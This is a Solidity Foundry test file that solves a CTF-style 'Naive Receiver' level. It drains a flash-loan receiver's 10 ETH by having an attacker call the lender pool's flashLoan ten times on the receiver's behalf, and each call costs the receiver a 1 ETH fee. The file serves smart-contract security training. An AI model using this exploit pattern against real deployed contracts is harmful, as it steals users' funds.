// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {FlashLoanReceiver} from "../../../src/Contracts/naive-receiver/FlashLoanReceiver.sol";
import {NaiveReceiverLenderPool} from "../../../src/Contracts/naive-receiver/NaiveReceiverLenderPool.sol";

contract NaiveReceiver is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;
    uint256 internal constant ETHER_IN_RECEIVER = 10e18;

    Utilities internal utils;
    NaiveReceiverLenderPool internal naiveReceiverLenderPool;
    FlashLoanReceiver internal flashLoanReceiver;
    address payable internal user;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(2);
        user = users[0];
        attacker = users[1];

        vm.label(user, "User");
        vm.label(attacker, "Attacker");

        naiveReceiverLenderPool = new NaiveReceiverLenderPool();
        vm.label(
            address(naiveReceiverLenderPool),
            "Naive Receiver Lender Pool"
        );
        vm.deal(address(naiveReceiverLenderPool), ETHER_IN_POOL);

        assertEq(address(naiveReceiverLenderPool).balance, ETHER_IN_POOL);
        assertEq(naiveReceiverLenderPool.fixedFee(), 1e18);

        flashLoanReceiver = new FlashLoanReceiver(
            payable(naiveReceiverLenderPool)
        );
        vm.label(address(flashLoanReceiver), "Flash Loan Receiver");
        vm.deal(address(flashLoanReceiver), ETHER_IN_RECEIVER);

        assertEq(address(flashLoanReceiver).balance, ETHER_IN_RECEIVER);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        // 1. all eth in naiveReceiverLenderPool (ETHER_IN_POOL + ETHER_IN_RECEIVER)
        // 2. fee = 1 eth
        // 3. the function flashLoan of naiveReceiverLenderPool allow anyone to call (but use borrower as a parameter)
        // 4. so All ETH will be drained from any receiver contract by attacker
        vm.startPrank(attacker);
        // 5. attack (get 1 ether per attack)
        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);

        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(
            unicode"\n🎉 Congratulations, you can go to the next level! 🎉"
        );
    }

    function validation() internal {
        // All ETH has been drained from the receiver
        assertEq(address(flashLoanReceiver).balance, 0);
        assertEq(
            address(naiveReceiverLenderPool).balance,
            ETHER_IN_POOL + ETHER_IN_RECEIVER
        );
    }
}
